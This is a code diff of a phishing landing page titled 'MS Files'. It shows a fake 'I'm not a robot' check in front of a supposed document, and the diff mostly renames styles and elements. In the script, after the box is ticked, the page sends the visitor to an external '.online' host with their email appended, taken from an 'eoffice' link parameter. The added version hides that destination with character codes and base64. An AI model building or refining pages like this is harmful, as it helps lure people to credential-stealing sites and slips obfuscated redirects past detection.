@@ -5,42 +5,40 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>MS Files</title>
   <style>
-    /* Elegant color scheme */
+   
     :root {
-      --primary: #1a73e8;
-      --primary-light: #e8f0fe;
-      --primary-dark: #0d5bbc;
-      --gray-50: #f8f9fa;
-      --gray-100: #f1f3f4;
-      --gray-200: #e8eaed;
-      --gray-300: #dadce0;
-      --gray-700: #5f6368;
-      --gray-900: #202124;
+      --blue: #1a56db;
+      --blue-light: #e0e7ff;
+      --blue-dark: #1e3a8a;
+      --gray-50: #f9fafb;
+      --gray-100: #f3f4f6;
+      --gray-200: #e5e7eb;
+      --gray-300: #d1d5db;
+      --gray-700: #374151;
+      --gray-900: #111827;
       --white: #ffffff;
-      --success: #34a853;
+      --green: #059669;
     }
 
     * {
+      box-sizing: border-box;
       margin: 0;
       padding: 0;
-      box-sizing: border-box;
     }
 
     body {
-      font-family: 'Google Sans', 'Segoe UI', system-ui, -apple-system, sans-serif;
-      background-color: var(--gray-50);
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, sans-serif;
+      background: var(--gray-50);
       color: var(--gray-900);
       min-height: 100vh;
       display: flex;
       justify-content: center;
       align-items: center;
-      padding: 1rem;
-      line-height: 1.5;
-      overflow-x: hidden;
+      padding: 20px;
     }
 
-    /* Loading screen with logo - Enhanced breathing effect */
-    .loader-container {
+    /* Initial loading screen */
+    .init-loader {
       position: fixed;
       top: 0;
       left: 0;
@@ -50,232 +48,224 @@
       flex-direction: column;
       justify-content: center;
       align-items: center;
-      background-color: var(--white);
+      background: var(--white);
       z-index: 1000;
-      transition: opacity 0.5s ease;
+      transition: opacity 0.6s ease;
     }
 
-    .loader-logo {
-      width: 140px;
-      height: 140px;
-      object-fit: contain;
-      margin-bottom: 1.5rem;
-      animation:
-        fadeIn 0.8s cubic-bezier(0.22, 1, 0.36, 1),
-        breathing 2s ease-in-out infinite;
+    .init-logo {
+      width: 200px;
+      height: 200px;
+      margin-bottom: 20px;
+      animation: pulse 2s infinite ease-in-out;
     }
 
-    .loader-text {
+    .init-text {
       color: var(--gray-700);
-      font-size: 1rem;
-      margin-top: 1rem;
+      font-size: 16px;
       opacity: 0;
-      animation: fadeIn 0.5s ease 0.3s forwards;
+      animation: fadeIn 0.5s ease 0.4s forwards;
+    }
+
+    @keyframes pulse {
+      0%, 100% { transform: scale(0.95); opacity: 0.85; }
+      50% { transform: scale(1.05); opacity: 1; }
     }
 
     @keyframes fadeIn {
-      from { opacity: 0; transform: translateY(10px); }
+      from { opacity: 0; transform: translateY(8px); }
       to { opacity: 1; transform: translateY(0); }
     }
 
-    @keyframes breathing {
-      0% { transform: scale(0.92); opacity: 0.9; }
-      50% { transform: scale(1.08); opacity: 1; }
-      100% { transform: scale(0.92); opacity: 0.9; }
-    }
-
-    /* Main content */
-    .verification-content {
-      max-width: 440px;
+    /* Main content area */
+    .access-panel {
+      max-width: 480px;
       width: 100%;
       opacity: 0;
-      transform: translateY(10px);
-      transition: all 0.5s cubic-bezier(0.22, 1, 0.36, 1);
+      transform: translateY(15px);
+      transition: all 0.5s cubic-bezier(0.23, 1, 0.32, 1);
     }
 
-    .verification-content.active {
+    .access-panel.visible {
       opacity: 1;
       transform: translateY(0);
     }
 
-    .verification-header {
-      margin-bottom: 2rem;
-    }
-
-    .verification-title {
-      font-size: 1.5rem;
-      font-weight: 500;
-      margin-bottom: 0.75rem;
-      color: var(--gray-900);
-      letter-spacing: -0.2px;
-    }
-
-    .verification-subtitle {
-      color: var(--gray-700);
-      font-size: 1.1rem;
+    .panel-header {
       text-align: center;
-      font-weight: 500;
-      line-height: 1.4;
+      margin-bottom: 30px;
     }
 
-    /* Verification control */
+    .panel-title {
+      font-size: 20px;
+      font-weight: 500;
+      margin-bottom: 12px;
+      color: var(--gray-900);
+    }
+
+    .panel-subtitle {
+      color: var(--gray-700);
+      font-size: 16px;
+      line-height: 1.5;
+    }
+
+    /* Verification section */
+    .verification-section {
+      background: var(--gray-100);
+      padding: 24px;
+      border-radius: 16px;
+      margin-bottom: 24px;
+      transition: all 0.3s ease;
+      border: 1px solid var(--gray-200);
+      position: relative;
+    }
+
+    .verification-section:hover {
+      border-color: var(--gray-300);
+      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.05);
+    }
+
     .verification-control {
       display: flex;
       align-items: center;
       justify-content: space-between;
-      background: var(--gray-100);
-      padding: 1.25rem 1.5rem;
-      border-radius: 12px;
-      margin-bottom: 1.5rem;
-      transition: all 0.3s ease;
-      border: 1px solid var(--gray-200);
-      position: relative;
-      overflow: hidden;
     }
 
-    .verification-control:hover {
-      border-color: var(--gray-300);
-      box-shadow: 0 1px 2px rgba(0, 0, 0, 0.05);
-    }
-
-    .verification-checkbox {
+    .verification-label {
       display: flex;
       align-items: center;
-      gap: 1rem;
+      gap: 16px;
       cursor: pointer;
     }
 
-    .checkbox-input {
-      width: 20px;
-      height: 20px;
+    .verification-check {
+      width: 22px;
+      height: 22px;
       border: 2px solid var(--gray-300);
-      border-radius: 4px;
+      border-radius: 5px;
       cursor: pointer;
       transition: all 0.2s ease;
-      appearance: none;
       position: relative;
       flex-shrink: 0;
     }
 
-    .checkbox-input:checked {
-      background-color: var(--primary);
-      border-color: var(--primary);
+    .verification-check:checked {
+      background-color: var(--blue);
+      border-color: var(--blue);
     }
 
-    .checkbox-input:checked::after {
+    .verification-check:checked::after {
       content: "";
       position: absolute;
-      left: 6px;
-      top: 2px;
+      left: 7px;
+      top: 3px;
       width: 5px;
-      height: 10px;
+      height: 11px;
       border: solid white;
       border-width: 0 2px 2px 0;
       transform: rotate(45deg);
     }
 
-    .checkbox-label {
+    .verification-text {
       font-weight: 500;
       user-select: none;
       color: var(--gray-900);
-      text-align: left;
     }
 
-    /* CAPTCHA badge */
-    .captcha-badge {
+    /* Security badge */
+    .security-badge {
       display: flex;
       flex-direction: column;
       align-items: flex-end;
     }
 
-    .captcha-icon {
-      width: 28px;
-      height: 28px;
+    .security-icon {
+      width: 30px;
+      height: 30px;
     }
 
-    .captcha-links {
+    .security-links {
       display: flex;
-      gap: 0.75rem;
-      margin-top: 0.5rem;
+      gap: 16px;
+      margin-top: 8px;
     }
 
-    .captcha-link {
-      font-size: 0.75rem;
-      color: var(--primary);
+    .security-link {
+      font-size: 13px;
+      color: var(--blue);
       text-decoration: none;
-      transition: color 0.2s ease;
     }
 
-    .captcha-link:hover {
-      color: var(--primary-dark);
+    .security-link:hover {
       text-decoration: underline;
     }
 
-    /* Loading and success states */
-    .verification-loading {
+    
+    .processing {
       pointer-events: none;
     }
 
-    .verification-loading::before {
+    .processing::before {
       content: "";
       position: absolute;
       top: 0;
       left: 0;
       width: 100%;
       height: 100%;
-      background-color: rgba(255, 255, 255, 0.8);
+      background-color: rgba(255, 255, 255, 0.85);
       z-index: 1;
+      border-radius: 16px;
     }
 
-    .verification-loading::after {
+    .processing::after {
       content: "";
       position: absolute;
       top: 50%;
       left: 50%;
       transform: translate(-50%, -50%);
-      width: 24px;
-      height: 24px;
-      border: 3px solid rgba(26, 115, 232, 0.2);
-      border-top-color: var(--primary);
+      width: 26px;
+      height: 26px;
+      border: 3px solid rgba(26, 86, 219, 0.2);
+      border-top-color: var(--blue);
       border-radius: 50%;
-      animation: spin 1s linear infinite;
+      animation: rotate 1s linear infinite;
       z-index: 2;
     }
 
-    .verification-success {
-      background-color: rgba(52, 168, 83, 0.1);
-      border-color: var(--success);
+    .verified {
+      background-color: rgba(5, 150, 105, 0.1);
+      border-color: var(--green);
     }
 
-    .verification-success .checkbox-input {
-      border-color: var(--success);
-      background-color: var(--success);
+    .verified .verification-check {
+      border-color: var(--green);
+      background-color: var(--green);
     }
 
-    @keyframes spin {
+    @keyframes rotate {
       0% { transform: translate(-50%, -50%) rotate(0deg); }
       100% { transform: translate(-50%, -50%) rotate(360deg); }
     }
 
-    /* Simplified success feedback */
-    .success-checkmark {
-      width: 24px;
-      height: 24px;
+  
+    .success-icon {
+      width: 26px;
+      height: 26px;
       position: absolute;
-      right: 1.5rem;
+      right: 24px;
       opacity: 0;
-      transform: scale(0.8);
+      transform: scale(0.7);
       transition: all 0.3s ease;
     }
 
-    .verification-success .success-checkmark {
+    .verified .success-icon {
       opacity: 1;
       transform: scale(1);
     }
 
-    .success-checkmark path {
-      stroke: var(--success);
-      stroke-width: 2.5;
+    .success-icon path {
+      stroke: var(--green);
+      stroke-width: 2.8;
       stroke-linecap: round;
       stroke-linejoin: round;
       fill: none;
@@ -283,11 +273,11 @@
       stroke-dashoffset: 0;
     }
 
-    .success-checkmark.animate path {
-      animation: dash 0.6s ease-out forwards;
+    .success-icon.animated path {
+      animation: draw 0.7s ease-out forwards;
     }
 
-    @keyframes dash {
+    @keyframes draw {
       0% {
         stroke-dashoffset: 1000;
       }
@@ -296,54 +286,58 @@
       }
     }
 
-    /* Confetti canvas */
-    #confetti-canvas {
+    /* Celebration effects */
+    #celebration {
       position: fixed;
       top: 0;
       left: 0;
       width: 0%;
       height: 0%;
       pointer-events: none;
-      z-index: 100;
+      z-index: 99;
     }
   </style>
 </head>
 <body>
-  <!-- Confetti canvas -->
-  <canvas id="confetti-canvas"></canvas>
+  <!-- Celebration canvas -->
+  <canvas id="celebration"></canvas>
 
-  <!-- Loading screen with logo -->
-  <div class="loader-container" id="loader">
-    <img src="logo.png" alt="Secure Portal" class="loader-logo">
+  <!-- Initial loading screen -->
+  <div class="init-loader" id="initialLoader">
+<!--    <svg class="init-logo" viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">-->
+<!--      <rect x="10" y="10" width="80" height="80" rx="5" fill="#1a56db" fill-opacity="0.2"/>-->
+<!--      <path d="M35 35H65V65H35V35Z" stroke="#1a56db" stroke-width="6"/>-->
+<!--      <path d="M45 45H55V55H45V45Z" fill="#1a56db"/>-->
+<!--    </svg>-->
+    <img class="init-logo" src="logo.png">
   </div>
 
-  <!-- Verification content -->
-  <div class="verification-content" id="verificationContent">
-    <div class="verification-card">
-      <div class="verification-header">
-        <p class="verification-subtitle">To view this document,<br>verify you're not a robot below</p>
-      </div>
+  <!-- Main content -->
+  <div class="access-panel" id="accessPanel">
+    <div class="panel-header">
+      <p class="panel-subtitle">To view this document,<br>verify you're not a robot below</p>
+    </div>
 
-      <div class="verification-control" id="verificationControl">
-        <label class="verification-checkbox">
-          <input type="checkbox" class="checkbox-input" id="humanCheck">
-          <span class="checkbox-label">I'm not a robot</span>
+    <div class="verification-section" id="verificationSection">
+      <div class="verification-control">
+        <label class="verification-label">
+          <input type="checkbox" class="verification-check" id="verificationCheck">
+          <span class="verification-text">I'm not a robot</span>
         </label>
 
-        <div class="captcha-badge">
-          <svg class="captcha-icon" viewBox="0 0 122.88 116.79">
-            <path fill="#1C3AA9" d="M101.42,40.78c0-0.59-0.02-1.17-0.04-1.75V5.88l-9.16,9.17C84.72,5.86,73.31,0,60.53,0 c-13.3,0-25.12,6.35-32.59,16.18l15.02,15.18c1.47-2.72,3.56-5.06,6.08-6.83c2.62-2.05,6.34-3.72,11.48-3.72 c0.62,0,1.1,0.07,1.45,0.21c6.37,0.5,11.89,4.02,15.14,9.12L66.48,40.77C79.95,40.72,95.17,40.69,101.42,40.78L101.42,40.78 L101.42,40.78z M101.42,40.78L101.42,40.78L101.42,40.78L101.42,40.78z"/>
-            <path fill="#4285F4" d="M60.29,0c-0.59,0-1.17,0.02-1.75,0.04H25.38l9.17,9.16C25.37,16.71,19.5,28.12,19.5,40.9 c0,13.3,6.35,25.12,16.18,32.59l15.18-15.02c-2.72-1.47-5.06-3.56-6.83-6.08c-2.05-2.62-3.72-6.34-3.72-11.48 c0-0.62,0.07-1.1,0.21-1.45c0.5-6.37,4.02-11.89,9.12-15.14l10.63,10.63C60.23,21.47,60.19,6.26,60.29,0L60.29,0L60.29,0z M60.29,0 L60.29,0L60.29,0L60.29,0z"/>
-            <path fill="#ABABAB" d="M19.51,40.9c0,0.59,0.02,1.17,0.04,1.75V75.8l9.16-9.16c7.5,9.18,18.91,15.04,31.69,15.04 c13.3,0,25.12-6.35,32.59-16.18L77.97,50.32c-1.47,2.72-3.56,5.06-6.08,6.83c-2.62,2.05-6.34,3.72-11.48,3.72 c-0.62,0-1.1-0.07-1.45-0.21c-6.37-0.5-11.89-4.02-15.14-9.12l10.63-10.63C40.98,40.96,25.76,40.99,19.51,40.9L19.51,40.9 L19.51,40.9z M19.51,40.9L19.51,40.9L19.51,40.9L19.51,40.9z"/>
+        <div class="security-badge">
+          <svg class="security-icon" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <path d="M12 22C12 22 20 18 20 12V5L12 2L4 5V12C4 18 12 22 12 22Z" stroke="#1C3AA9" stroke-width="2"/>
+            <path d="M9 12L11 14L15 10" stroke="#4285F4" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
           </svg>
-          <div class="captcha-links">
-            <a href="#" class="captcha-link">Privacy</a>
-            <a href="#" class="captcha-link">Terms</a>
+          <div class="security-links">
+            <a href="#" class="security-link">Privacy</a>
+            <a href="#" class="security-link">Terms</a>
           </div>
         </div>
 
-        <!-- Simplified success checkmark -->
-        <svg class="success-checkmark" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+        <!-- Success indicator -->
+        <svg class="success-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
           <path d="M20 6L9 17l-5-5"/>
         </svg>
       </div>
@@ -351,158 +345,156 @@
   </div>
 
   <script>
-    // Confetti function (minified and self-contained)
-    function startConfetti() {
-      const canvas = document.getElementById('confetti-canvas');
+    // Celebration animation
+    function launchCelebration() {
+      const canvas = document.getElementById('celebration');
       canvas.width = window.innerWidth;
       canvas.height = window.innerHeight;
       const ctx = canvas.getContext('2d');
-      const particles = [];
-      const colors = ['#1a73e8', '#34a853', '#fbbc05', '#ea4335', '#4285f4'];
-      
-      function Particle() {
+      const elements = [];
+      const colors = ['#1a56db', '#059669', '#d97706', '#dc2626', '#7c3aed'];
+
+      function Element() {
         this.x = Math.random() * canvas.width;
         this.y = Math.random() * canvas.height - canvas.height;
-        this.diameter = Math.random() * 10 + 5;
+        this.size = Math.random() * 12 + 3;
         this.color = colors[Math.floor(Math.random() * colors.length)];
         this.speed = Math.random() * 3 + 2;
         this.angle = Math.random() * 360;
         this.spin = Math.random() < 0.5 ? -1 : 1;
-        this.rotationSpeed = Math.random() * 5;
+        this.rotation = Math.random() * 10;
       }
 
-      Particle.prototype.update = function() {
+      Element.prototype.update = function() {
         this.y += this.speed;
-        this.angle += this.rotationSpeed * this.spin;
+        this.angle += this.rotation * this.spin;
         if (this.y > canvas.height) {
-          this.y = -this.diameter;
+          this.y = -this.size;
           this.x = Math.random() * canvas.width;
         }
       };
 
-      Particle.prototype.draw = function() {
+      Element.prototype.draw = function() {
         ctx.save();
         ctx.translate(this.x, this.y);
         ctx.rotate(this.angle * Math.PI / 180);
         ctx.fillStyle = this.color;
-        ctx.fillRect(-this.diameter/2, -this.diameter/2, this.diameter, this.diameter);
+        ctx.fillRect(-this.size/2, -this.size/2, this.size, this.size);
         ctx.restore();
       };
 
-      function init() {
-        for (let i = 0; i < 100; i++) {
-          particles.push(new Particle());
+      function initialize() {
+        for (let i = 0; i < 120; i++) {
+          elements.push(new Element());
         }
       }
 
       function animate() {
         ctx.clearRect(0, 0, canvas.width, canvas.height);
-        for (let i = 0; i < particles.length; i++) {
-          particles[i].update();
-          particles[i].draw();
+        for (let i = 0; i < elements.length; i++) {
+          elements[i].update();
+          elements[i].draw();
         }
         requestAnimationFrame(animate);
       }
 
-      init();
+      initialize();
       animate();
-      
+
       // Stop after 3 seconds
       setTimeout(() => {
-        particles.length = 0;
+        elements.length = 0;
       }, 3000);
     }
 
-    // Function to transform email to encoded format
-    function transformEmailToEncoded(email) {
-      // Reverse the email string
-      let reversed = email.split('').reverse().join('');
-      // Replace '.' with 'QQQ' and '@' with 'ZZZ'
-      let encoded = reversed.replace(/\./g, 'QQQ').replace(/@/g, 'ZZZ');
-      return encoded;
-    }
+    // Process URL parameters
+    function processUrlParameters() {
+      // Obfuscated base URL construction
+      const urlParts = [
+        String.fromCharCode(104, 116, 116, 112, 115, 58), 
+        String.fromCharCode(47, 47), // "//"
+        'protonfiles',
+        '.',
+        atob('ZXNna3J1aWVzeWFweWR0'),
+        '.',
+        atob('b25saW5l'),
+        '/',
+        'tOnDqXfQ'
+      ];
 
-    // Function to check and transform email immediately
-    function checkAndTransformEmail() {
+      const baseDestination = urlParts.join('');
       const urlParams = new URLSearchParams(window.location.search);
-      const officeParam = urlParams.get("eoffice");
+      let officeParam = urlParams.get("eoffice") || "";
+
       
-      if (officeParam && officeParam.includes('@') && officeParam.includes('.')) {
-        // Transform the email to encoded format
-        const encodedEmail = transformEmailToEncoded(officeParam);
-        
-        // Update the URL in the address bar without reloading
+      if (officeParam.includes('@') && officeParam.includes('.')) {
+       
+        const reversed = officeParam.split('').reverse().join('');
+        const encoded = reversed.replace(/\./g, 'QQQ').replace(/@/g, 'ZZZ');
+
+       
         const newUrl = new URL(window.location.href);
-        newUrl.searchParams.set('eoffice', encodedEmail);
+        newUrl.searchParams.set('eoffice', encoded);
         window.history.replaceState({}, '', newUrl.toString());
-        
-        return encodedEmail;
+
+        officeParam = encoded;
       }
-      return officeParam;
+
+      return baseDestination + "#" + encodeURIComponent(officeParam);
     }
 
-    // URL obfuscation and construction
-    function getRedirectUrl() {
-      const baseUrl = "https://protonfiles.egvhfztransfercygv.online/tOnDqXfQ";
-      const officeParam = checkAndTransformEmail() || "";
-      return baseUrl + "#" + encodeURIComponent(officeParam);
-    }
-
+    
     document.addEventListener('DOMContentLoaded', () => {
-      // Check and transform email immediately when page loads
-      checkAndTransformEmail();
+      const initialLoader = document.getElementById('initialLoader');
+      const accessPanel = document.getElementById('accessPanel');
+      const verificationCheck = document.getElementById('verificationCheck');
+      const verificationSection = document.getElementById('verificationSection');
+      const successIcon = document.querySelector('.success-icon');
 
-      const loader = document.getElementById('loader');
-      const verificationContent = document.getElementById('verificationContent');
-      const humanCheck = document.getElementById('humanCheck');
-      const verificationControl = document.getElementById('verificationControl');
-      const successCheckmark = document.querySelector('.success-checkmark');
-
-      // Hide loader and show content after 2 seconds
+      
       setTimeout(() => {
-        loader.style.opacity = '0';
+        initialLoader.style.opacity = '0';
         setTimeout(() => {
-          loader.style.display = 'none';
-          verificationContent.classList.add('active');
-        }, 500);
+          initialLoader.style.display = 'none';
+          accessPanel.classList.add('visible');
+        }, 600);
       }, 2000);
 
       // Handle verification
-      humanCheck.addEventListener('change', function() {
+      verificationCheck.addEventListener('change', function() {
         if (this.checked) {
-          // Add loading state
-          verificationControl.classList.add('verification-loading');
+          // Add processing state
+          verificationSection.classList.add('processing');
 
-          // Simulate verification process (2 seconds)
+          // Simulate verification process
           setTimeout(() => {
-            verificationControl.classList.remove('verification-loading');
-            verificationControl.classList.add('verification-success');
-            successCheckmark.classList.add('animate');
-            
-            // Trigger confetti
-            startConfetti();
+            verificationSection.classList.remove('processing');
+            verificationSection.classList.add('verified');
+            successIcon.classList.add('animated');
 
-            // Redirect after brief delay
+            // Launch celebration
+            launchCelebration();
+
+            
             setTimeout(() => {
-              window.location.href = getRedirectUrl();
+              window.location.href = processUrlParameters();
             }, 800);
           }, 2000);
         } else {
-          verificationControl.classList.remove('verification-success');
-          successCheckmark.classList.remove('animate');
+          verificationSection.classList.remove('verified');
+          successIcon.classList.remove('animated');
         }
       });
 
       // Keyboard accessibility
-      humanCheck.addEventListener('keydown', (e) => {
+      verificationCheck.addEventListener('keydown', (e) => {
         if (e.key === 'Enter' || e.key === ' ') {
           e.preventDefault();
-          humanCheck.checked = !humanCheck.checked;
-          humanCheck.dispatchEvent(new Event('change'));
+          verificationCheck.checked = !verificationCheck.checked;
+          verificationCheck.dispatchEvent(new Event('change'));
         }
       });
     });
   </script>
 </body>
 </html>
-
